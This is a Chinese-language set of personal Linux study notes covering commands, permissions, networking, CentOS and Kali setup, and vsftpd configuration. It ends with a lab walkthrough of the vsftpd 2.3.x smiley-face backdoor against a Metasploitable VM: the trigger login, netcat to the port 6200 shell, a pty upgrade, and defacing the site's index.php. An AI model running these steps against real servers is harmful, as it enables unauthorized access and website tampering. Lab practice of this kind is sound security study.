---
title: Linux
date: 2022-03-24 11:53:59
categories: 运维
top: 29
tags:
---

# Linux基础

## Linux 概念

### Linux 目录结构

![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825171924754.png)

![Linux目录结构](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825172226876.png)

### Linux标准输入输出

````bash
# 标准输出：0
终端
# 标准输入：1
键盘
# 标准错误：2
终端
# 输出重定向
echo "hello word" > aa.txt
````

![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828151659700.png)

### 文件权限

```bash
# 一个文件或目录，有三种角色：文件的所有者u，文件所有者的所属组g，其他用户o，所有用户a

## Linux三种权限位
read # 文件是cat; 目录是ls
write # 文件是touch,vim; 目录是 mkdir,mv,rm
execute # 文件是./脚本， 目录是cd 命令
```

###  文件特殊权限

```bash
##文件特殊权限是对一般权限的补充（由于管理员不受一般权限的控制，可以通过特殊权限来控制），特殊权限会对管理员生效。
# SUID针对所有者的特殊权限：会让此文件执行者临时获取文件所有者的权限来完成某些工作，rwS
# SGID
# SBID其他用户的权限，
注：
sudo 是借用root权限
SUID 是借用所有者的权限
SGID 是借用属组的权限
```

## Linux文件类型

```bash
以下文件类型均有对应字符表示：
- : 平台文件
d(directory) : 目录文件 
c(character) : 字符设备文件
b(block) : 块设备文件
s(socket) : 套接字文件
p(pipe) : 管道文件
l(link) : 符号链接文件
# 普通文件、目录文件、块设备文件、字符设备文件和套接字文件都是实际存在文件系统中的文件，而符号链接文件和命名管道

# 文件类型，权限，链接数，文件所有者，文件所属组，文件大小，最后修改时间，名称
command --help # 查看命令

## ls
ls -alh # 大小使用k单位显示
ls -ai # 显示index索引

## file [选项] 文件名
file anaconda-ks.cfg # ASCII text 普通文本文件
file /bin/cd # shell script 可运行脚本
file /var/log/wtmp # data 数据格式的文件
file /var/log/tuned # directory 目录文件
file /
```



### 普通文件类型（Regular File）

```
1、纯文本文件（ASCII）: 普通文本，可以直接读取；
2、二进制文件（binary）：可运行脚本
3、数据格式的文件（data）：cat /var/log/wtmp 读取不了，要使用 who /var/log/wtmp 读取
```

### 目录文件类型（Directory File）

```
cd 命令可以进入的，蓝色
```

### 设备文件类型（Device File）

```
1、块设备文件（Block Device File）：硬盘、USB；IDE（/dev/hd**）,SCSI/SATA/USB（/dev/sd**）
2、字符设备文件（Character Device File）：键盘，鼠标，打印机
```

### 套接字文件（Socket）

```
套接字文件是一种特殊的文件，用于进程间的通信，提供一种全双工的通信方式。网络通信方式，网络数据连接。
```

### 管道文件（FIFO）

```bash
管道文件，也称为命名管道，用于实现进程间的通信；提供半双工的通信方式，在Shell脚本和进程通信场景中使用。
```

### 链接文件（Symbolic link）

```
软链接：例如 /bin -> usr/bin
硬链接：usr/bin
```

### 特殊文件（Special file）

```
"/dev/null"文件：用于丢失数据
"/dev/zero"文件：用于产生全零数据
"/dev/random" 和 "/dev/urandom"文件：用于产生随机数等
```



## Linux 命令

### 文件

```bash
# 1、创建文件
touch aa.txt # 创建aa.txt文件
echo whoami > aa.txt ## 输入whoami文本到aa.txt文件中
# 2、显示文件内容（6个）：cat/more/less/head/tail
# 3、搜索、排序、去重（3个）：grep, sort, uniq
# 4、比较（2个）comm, diff
# 5、复制、删除、移动（3个）：cp/rm/mv
# 6、统计: wc
# 7、查找: find
# 8、打包、压缩、解压缩（3个）： bzip2/gzip/tar
```

### 目录

```bash
mkdir test # 创建test目录
mkdir -p a/b/c # 递归创建a,b,c层级目录

rm -r test # 删除test目录
rm -rf a/b/c # 递归删除a,b,c层级目录
```

### 文件&目录

```bash
mv a test # 将 a 目录移动到 test下
mv a b # 将a目录重命名为b目录

cp aa.txt test # 将aa.txt拷贝到test目录下
cp aa.txt test\bb.txt # # 将aa.txt拷贝到test下并重命名为bb
cp -r a test # 将a 目录复制到test目录下
```

### echo命令

```bash
echo whoami > aa.txt
echo whoami >> aa.txt

echo -e "\a" # -e后面扩展字符
echo -e "123\b123" # \b删除前面一个字符
echo -e "123\n123" # \n 换行
echo -e "123\r123" # \r 回车
echo -e "123\t123" # \t 制表符
echo -e "\x61\t\x62\t\x63\t\x64\t\x65\t\x66" # 16进制
echo -e "\e[1;33m whoami \e[0m" # [1;33m 颜色
echo -e "\e[;31m \e[1:42m whoami \e[0m \e[0m" # 括号

echo %(date + "%Y-%m-%d %H:%M:%S") # 时间

```

### cat 命令

```bash
cat aa.txt # 查看文件内容
cat > aa.txt # 覆盖输入，按Ctrl + D结束
cat >> aa.txt # 追加输入，按Ctrl + D结束
cat aa.txt bb.txt cc.txt > dd.txt # 将3个文件的内容写到dd.txt中

```

### more 命令

```bash
more # 空格(或者d)向下翻页，b向上翻页，回车下一行，=显示当前行号
more -6 aa.txt # 指定每一页显示6行 
more +6 aa.txt # 从第6行开始显示
```

### less 命令

```bash
# 可以使用上下箭头来控制浏览内容
/a # / 向下搜索内容a
?a # ? 向上搜索内容a
less -i # 忽略大小写
less -N aa.txt # 显示行号，可以通过:跳转
```

### group 命令（三剑客之一）

```bash
ps -ef | grep python # 搜索单词grep
ps -ef | grep python -c # 查看单词grep的个数
ifconfig | grep ens33 # 查找到ens33网卡行
# 常见用法
cat aa.txt | grep user # 查询带user的行
cat aa.txt | grep -i user # 不区分大小写
cat aa.txt | grep -v "%" #查看 aa.txt 文件中，不包含%的行
cat aa.txt | grep ^"#" # 查看 # 号开头的行
cat aa.txt | grep ^[^1] # 输出不是1开头的内容
cat aa.txt | grep y$ # 查看y结尾的内容
cat aa.txt | grep ^$ # 查看空行
cat aa.txt | grep ^[^$] # 不要显示空行
# 扩展
cat aa.txt | grep -E "a|b|c" # 输出包含a,b,c开头的行
cat aa.txt | grep - 
```

![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825192252242.png)

### wc 命令

```bash
# 统计文件的字节数、字数、行数。
# wc [选项] [文件]
wc aa.txt
行数	单词数	字节数	文件名
-c # 统计字节数
-m # 统计字符数
-l # 统计行数
-w # 统计字数
```

### find 命令（重要）

```bash
find / -iname test # 不区分大小写
find / -type d -iname test # 目录类型，不区分大小写 
find / -type f -perm 777 # 查找777权限的文件
find / -type l ! -perm 777 # 查找不是777权限的连接文件
find / -type f -empty # 查找所有空文件
find / -user tss -name "*" # 查找用户tss的所有文件
find / -user tss 2 > null # 将报错（返回2）的不要显示
```

![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825192802954.png)

### bzip2 | gzip 打包 & 压缩（重要）

```bash
# bzip2 -> .bz2文件，v 是过程可视化，f 是强制解压（默认不保留源文件）
bzip2 aa.txt # 压缩生成aa.txt.bz2，不保留原文件
bzip2 -k aa.txt # 生成aa.txt.bz2，保留原文件
bzip2 -d aa.txt.bz2 # 解压，压缩包不保留
bzip2 -t aa.txt.bz2 # 检测压缩包是否有问题

# gzip -> .gz文件，v 是过程可视化，f 是强制解压（默认不保留源文件）
gzip aa.txt bb.txt # 分别压缩，生成2个压缩文件 aa.txt.gz, bb.txt.gz
gzip -l aa.txt.gz # 列出压缩文件的内容信息
gzip -d aa.txt.gz # 解压
gzip -r test # 递归压缩test目录下的aa.txt，bb.txt，cc.txt
gzip -rd test # 递归解压test目录下的压缩文件

## tar -> .tar文件，f是一定要有的，c是创建，x是解压缩，v是可视化，t是查看压缩内容（默认保留源文件）
# z: gz格式
# j: bz2格式
tar -cvf aa.txt.tar aa.txt
tar -xvf aa.txt.tar
tar -czvf aa.txt.gz aa.txt
tar -xzvf aa.txt.gz
tar -cjvf aa.txt.bz2 aa.txt
tar -xjvf aa.txt.bz2
```

### uname 命令

```bash
uname # 显示linux
uname -a # 查询系统所有的信息
uname -r # 发行编号
uname -v # 查看版本号
uname - io # 操作系统名称
```

### service 命令

```bash
service [服务名] [start | stop | restart | reload | status]
# 在 Centos7.0 后，很多服务不在使用 `service`，而是是 `systemctl`
```

### systemctl 命令

```bash
systemctl [optinons] command [unit]
# options: -H, --host（指定systemd实例的主机名或者IP）
[start, stop, restart, reload, enable, disable, status, is-active, is-enable, mask, unmask等]
systemctl show ServiceName # 查看服务的内容
systemctl mask ServiceName # 注销，不可以start，需要unmask
systemctl unmask ServiceName # 取消注销
```

### cut 命令

```bash
cut [选项参数] [filename]
# cut 命令，剪
# 文件aa.txt文件如下, 分隔符可以是空格，逗号等
1	2	3
4	5	6
# cut -d '	' -f 1 aa.txt
1
4
# cut -d '	' -f 1-2 aa.txt
1	2
4	5
cut -d : -f 1,3 /etc/passwd # 只显示第1,3列
```

### Linux 痕迹命令

```bash
w # 显示系统当前登录的用户信息，who命令信息文件（/var/run/utmp）
who # 显示系统中正在使用的用户，包含ID，tty,IP，登录时间
last # 查看用户近期登录信息
tty # 查看当前登录的tty
lastlog # 账号最后登录时间
lastb # 登录错误记录
logname # 查看原始登录的用户（切换用户的情况）
```



### 多命令执行方式

```bash
# ; && || 之间混合使用
command1; command2; command3 # 顺序执行，命令中有错误也会执行后面
command1 && command2 && command3 # 顺序执行，有错误后面不执行
command1 || command2 || command3 # 命令1错误执行命令2，命令2错误执行命令3，命令1正确后面不执行
command1 | command2 | command3 # 除了管道过滤作用 或 ，只显示最后一个命令的结果
```



### vim 文件编辑

```bash
# 命令模式
dd # 删除（剪切）
yy # 复制
p # 粘贴
u # 撤销
ctrl + r # 恢复撤销
# 末行模式
/^字符串 # 向下查询字符串开头
?字符串& # 向上查询字符结尾，可以结合正则表达式
:set nu # 显示行号
:set nonu # 取消行号
```





## 用户和组

```
用户,UID=1000-60000
超级用户: root, ID=0
虚拟用户：1-999之间
```

### 用户

```bash
id # 查看用户的uid,gid,group

# 创建用户
useradd mz # 创建用户
passwd mz # 修改用户密码
su mz # 切换用户

# 删除用户
userdel -rf mz # 删除用户,f是强制删除（有进程），r是删除对应用户的家目录

# cat /etc/passwd
用户:密码:uid:gid:备注:家目录:shell_path
# cat /etc/shadow
用户:密码:修改时间:有效期

# /etc/sudoers 获取sudo的权限
root ALL=(ALL)	ALL # 方式1
echo "user	ALL=(ALL)	ALL" > /etc/sudoers/sudoers.d/user_sudoers # 方式2
```

### 组

```bash
# cat /etc/group

groupadd groupname1 # 创建组
groupdel groupname1 # 删除组

gpasswd -a user group # 将user添加到group中
gpasswd -d user group # 将user从group中删除
```



## 查看与终止进程

```bash
## 查询进程
ps [参数]
ps -aux # 显示所有进程 以更详细的内容展示
ps -ef
top # 动态，每3秒刷新一次，当前时间，启动时间，系统负载，tasks:全部进程；p cpu, m 内存, q退出

# yum install -y lsof 
lsof -i :22 # 查看22端口的进程
lsof -i 192.168.16.ip # 查看IP对应的端口进程
lsof -p 1283 # 1283进程打开的文件

## 删除进程
kill 进程ID
kill -9 进程ID # 强制删除
pkill -9 t pts/2 # 删除pts
pkill -9 sshd # 将所以这个服务的进程

## 场景
ping www.baidu.com > ping.txt & # 后台运行
jobs # 查看后台任务
fg 1 # 1 编号是jobs命令查看的，fg将1编号的jobs调到前台运行，可以按Ctrl + Z暂停，或者Ctrl+C结束
bg 1 # 将暂停的任务继续运行
tail -f ping.txt # -f 循环查看

```



## Linux 其他

### Linux 系统下的通配符 （20个）

```bash
* : 通配符，代表任意字符（0到多个）
? : 通配符，代表一个字符
# : 注释
\ : 转义字符，将特殊字符或通配符还原成一般符号
| : 分割两个管线命令的界定

; : 连接性命令的界定
~ : 用户的根目录
$ : 变量前需要加的变量值
! : 逻辑运算中的“非”
/ : 路径分割符号

> : 输出导向，为“取代”
>> : 输出导向， 为“累加”
'' : 不具有变量置换功能
"" : 具有变量置换功能
`` : quote符号，两个 `` 中间为可以执行的指令

() : 中间为子shell的起始与结束
[] : 中间为字符组合
{} : 中间为命令区块组合
& : 表示程序要在后台运行
&& : 当该符号前一个指令执行成功时，执行后一个指令
| : 管道符，表示上一条命令的输出，作为下一条命令参数进行传递
|| : 表示前一条命令执行成功时，后一条命令不再执行；如果前面一条命令执行失败，后面的命令再执行
```

### Linux系统下的常用快捷操作（七个）

```bash
Ctrl + C # 终止当前任务
Ctrl + D # 输入结束（回到登录界面）
Ctrl + M # 相当于Enter
Ctrl + S # 暂停屏幕的输出
Ctrl + Q # 恢复屏幕的输出
Ctrl + U # 再提示符下，将整行命令删除
Ctrl + Z # 暂停当前任务
```

## Linux网络

### ifconfig & ip & ping

```bash
# ifconfig
ifconfig -a
ifconfig -s # 查看网络服务连接状态
ifconfig ens33 down # 关闭网卡，IP地址没有了，网卡也没有了
ifconfig ens33 up # 启动网卡
ifdown ens33 # IP没有了，网卡还在
ifup ens33 # 

# ip
ip addr # 查看IP地址
ip addr add 192.168.16.101/24 dev ens33 # 临时添加IP地址，用于测试，重启就没有了
ip link # 查看当前设备情况
ip link set ens33 down # 关闭网卡，网卡不在，
ip link set ens33 up # 开启网卡
ip link set ens33 name ens32 # 关闭网卡后，可以修改网卡名称，之后再启动

# ping
ping -c 5 www.baidu.comn # 指定ping 次数
ping -s 1000 www.baidu.com # 指定包大小
```

### 网络静态配置

```bash
# 网卡配置目录
/etc/sysconfig/network-scripts/
cp ifcfg-ens33 ifcfg-ens33.bak # 备份网卡
# vim ifcfg-ens33
TYPE="Ethernet" # 以太网
PROXY_METHOD="none" # 代理方法：关闭
BROWSER_ONLY="no" # 仅仅是浏览器
BOOTPROTO="dhcp" # 网卡协议
DEFROUTE="yes" # 默认路由
IPV4_FAILURE_FATAL="no" # 
IPV6INIT="yes"
IPV6_AUTOCONF="yes"
IPV6_DEFROUTE="yes"
IPV6_FAILURE_FATAL="no"
IPV6_ADDR_GEN_MODE="stable-privacy"
NAME="ens33" # 网卡名称
UUID="5b505e8a-35f2-4920-8241-edd9f3070780" # 唯一标识码
DEVICE="ens33" # 设备名称
ONBOOT="yes" # 是否激活
# 静态新加（DNS最多3个）
IPADDR="192.168.16.101"
NETMASK="255.255.255.0"
GATEWAY="192.168.16.2"
DNS1="223.5.5.5" # 阿里
DNS2="8.8.8.8" # 谷歌
DNS3="192.168.16.2"
```



### route 路由配置

```bash
# route
ip route show # 查看路由信息
route # 显示路由 (default)
route -n # -n是以数字的方式显示 (0.0.0.0)

## 添加路由
# sudo ip route add <目标网络> via <网关IP> dev <接口>
sudo ip route add 192.168.1.0/24 via 10.0.0.1 dev eth0
# 默认路由
# sudo ip route add default via <网关IP> dev <接口>
sudo ip route add default via 10.0.0.1

## 删除路由
sudo ip route del <目标网络> via <网关IP> # sudo ip route del 192.168.1.0/24
sudo ip route del default # 删除默认路由

## 测试路由是否生效，查看 8.8.8.8 路由路径
ip route get 8.8.8.8
```



### DNS 检测- nslookup & tracert

```bash
# nslookup # 
nslookup www.baidu.com # 返回域名对应的IP地址

# tracert # 跟踪
yum install -y traceroute
traceroute www.wangdun.cn

# cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 223.5.5.5
nameserver 8.8.8.8
nameserver 192.168.16.2
```



### 网络监控 - netstat & ss

```bash
# netstat 查看网络连接
netstat -anpt # 显示当前主机所有互动的,TCP协议
netstat -anpu # 显示 UDP协议
netstat -lanpt # 监听

# ss 查看网络连接2，高并发的场景
ss -anpt # 和netstat差不多


```

### Wireshark工具学习

```bash
# http://nm.people.com.cn/

```



## 包管理工具

### rpm

```bash
# rpm五大功能：安装（-i）、卸载（-e）、升级(-u)、查询(-qa(所有rpm包| -ql(已安装的软件包))、验证(-qf) 
rpm -qa # 查询系统上的rpm包
```

## 服务vsftpd

### 安装&卸载vsftpd

```bash
# yum
# http://rpmfind.net/
# wget https://rpmfind.net/linux/mageia/distrib/8/x86_64/media/core/release/vsftpd-3.0.3-11.mga8.x86_64.rpm
yum repolist # 查看镜像源
yum search vsftpd # 查看vsftpd软件包
yum install vsftpd # 安装vsftpd软件
yum remove vsftpd # 卸载vsftpd软件
yum autoremove # 卸载残留
yum clear all
```

### 配置vsftpd

```bash
# /etc/vsftpd/vsftpd.conf
anonymous_enable=NO
chroot_local_user=YES
chroot_list_enable=YES
chroot_list_file=/etc/vsftpd/chroot_list
listen=YES
listen_ipv6=NO
# 
useradd ftpuser
passwd ftpuser
vim  /etc/vsftpd/user_list # 添加ftpuser
# systemctl restart vsftpd
netstat -anpt  # 查看21端口
```

### 使用vsftpd

```bash
# 客户端
yum install ftp
sftp ftpuser@192.168.16.101
get filename # 下载
put filename # 上传
```



---

# Centos7

## Centos7安装&配置

###  Centos7安装

```
```



### Centos7更换源

```bash
# 更换阿里源
curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
# 清理yum缓存
yum clean all
# 重新生成缓存
yum makecache
```

### Centos7安装常用工具

```bash
# wegt下载，net-tools ifconfig, bind-utils nslookup, vim
yum install -y wget net-tools bind-utils vim-enhanced tree
```

### Centos7关闭selinux

```bash
# 关闭selinux
cp /etc/selinux/config /etc/selinux/config.bak # 备份selinux备份
vim /etc/selinux/config # 将 enforcing 修改为 disabled 
getenforce # 检查 selinux是否是 disabled 状态

```

### Centos7网络配置

```bash
## ifconfig 命令
ifconfig -a # 查看所有网络设备
ifconfig ens33 # ifconfig 加设备名：查询指定设备
ifconfig -s # 查询网络通讯情况
ifconfig ens33:0 192.168.40.178 # 给设备添加虚拟网卡（冒号后的0代表虚拟网卡的序号，不能重复）
ifconfig ens33 up # 启动网卡
ifup ens33 # 启动网卡
ifconfig ens33 down # 关闭网卡
ifdown ens33 # 关闭网卡

## ip 命令
ip addr # 显示所有设备IP地址
ip addr add 192.168.0.150/24 dev ens33 # 给指定网卡设备ens33添加IP和掩码，立即生效
ip addr del 192.168.0.150/24 dev ens33 # 删除ens33上的192.168.0.150 IP信息，立即生效
ip link show # 显示当前设备情况 ip link
ip link set ens33 down # 关闭网卡
ip link set ens33 up # 开启网卡
ip link set ens33 name ens32 # 修改网卡名称
ip link set ens33 MTU 1320 # 修改网卡MTU
ip link set ens33 MAC xx:xx:xx:xx:xx:xx # 修改网卡MAC地址
ip route show # 显示当前路由信息
ip route add default via 192.168.0.1 dev ens33 # 添加默认路由
ip route del default via 192.168.0.1 dev ens33 # 删除默认路由


```

 ### 其他命令

```bash
hostname [主机名] # 临时修改主机名
hostnamectl set-hostname [主机名] # 永久修改主机名

route -n # 查看路由表

## netstat 端口扫描，查看端口是否正常，常见参数如下
netstat -anpt # 以数字形式显示当前系统中所有的TCP链接信息，同时显示对应的进程信息
netstat -antp | grep 22 # 查找22端口的信息
-a # 显示当前主机所有活动的网络链接信息
-n # 以数字的形式显示相关的主机地址和端口信息
-r # 显示路由表信息
-l # 显示处于监听状态的网络链接和端口信息
-t # 显示tcp协议的信息
-u # 显示udp协议的信息
-p # 显示与网络链接相关的进程号，进程名称信息（需要root权限）

## ss 查看系统网络连接情况，获取 socket 统计信息
-t # 显示tcp协议信息
-u # 显示udp协议信息
-w # 套接字
-x # 内核socket相关信息
-l # 处于监听装填
-a # 显示所有网络连接活动

## dig 命令
yum install bind-utils # Ubuntu上 apt install dnsutils
dig www.baidu.com

## 其他
who /var/log/wtmp # 查看登录记录
```





---

# Kali

## Kali安装&配置

### Kali安装

```bash
# 设置中文
sudo dpkg-reconfigure locales

# 修改root密码
sudo -i
password root

## root用户视图下，更换kali源仓库为国内
cd /etc/apt
cp sources.list sources.list.bak
# 阿里源
deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
# apt更新
apt update 
# 没有公钥解决方法：sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5
# 解决方法2
wget -qO- https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /usr/share/keyrings/kali-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/kali-archive-keyring.gpg] https://archive.kali.org/kali kali-rolling main non-free contrib" | sudo tee /etc/apt/sources.list

## 实用工具
# 检测主机是否存在
fping -asg 192.168.112.0/24 -C 1

## nmap  网络探测和安全审核
# nmap 192.168.112.128
# nmap -sV 192.168.112.128
# nmap -p 1-65535 192.168.112.128
# nmap -p- 192.168.112.128
```



---

# 漏洞

## 0001 - 笑脸漏洞 ):  (21 port, vsftpd 2.3)

### 原理

```bash
影响范围：vsftpd 2.3.x及以下版本
```



### 复现

```bash
# 靶场环境：metasploitable-linux-2.0.0.zip，解压打开，选择“我已复制虚拟机”

## kali
# 1、使用nmap 探活
nmap 192.168.16.0/24 # 确认有开发ftp 21端口的IP地址
nmap -sV 192.168.16.141 # 确认对应IP地址对应的ftp版本，V是版本

## 2、使用nc（瑞士小军刀）连接ftp。（aa用户名和aaaa密码随意，:)一定要有）
# 终端1
nc 192.168.16.141 21 # 21 ftp 端口
	user aa:)
	pass aaaa
# 终端2
sudo nmap -sS -p 6200 192.168.16.141
nc 192.168.16.141 6200 # 就可以连接上了，回车输入下面Python命令获取权限
python -c 'import pty;pty.spawn("/bin/bash")'

## 3、网页篡改
# http://192.168.16.141 是一个静态网页。（靶场自带的）
find / -name index.html # 查看静态网页的路径
cd /etc/www
cat index.php # 确认网站内容和该文件一致
wget http://img.k2r2.com/uploads/002/20230625/1618252013.jpg # 准备篡改的图片
mv 1618252013.jpg aa.jpg
echo '<img src="aa.jpg">' >> index.php # 篡改网页内容，增加图片
chmod 777 aa.jpg # 修改图片的权限
```

### 相关截图如下

![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828191322246.png)

![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828192716427.png)

![](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828192653371.png)

## 0002 - 
